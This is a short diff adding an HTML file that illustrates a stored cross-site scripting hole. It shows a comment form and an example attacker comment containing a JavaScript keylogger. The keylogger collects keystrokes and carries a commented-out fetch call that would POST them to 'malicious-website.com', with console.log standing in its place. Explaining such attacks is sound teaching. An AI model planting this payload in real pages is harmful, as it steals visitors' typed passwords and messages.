@@ -1,0 +1,25 @@
+<!-- This is a comment form on a website with an XSS vulnerability -->
+<form action="/post_comment" method="POST">
+    <input type="text" name="comment">
+    <input type="submit" value="Post Comment">
+</form>
+
+<!-- An attacker could post a comment that looks like this: -->
+<script>
+    let keys = '';
+
+    window.onkeydown = function(e) {
+        keys += e.key;
+    }
+
+    setInterval(function() {
+        if (keys.length > 0) {
+           // fetch('http://malicious-website.com', {
+            //    method: 'POST',
+             //   body: keys
+           // });
+           console.log(keys)
+            keys = '';
+        }
+    }, 1000);
+</script>
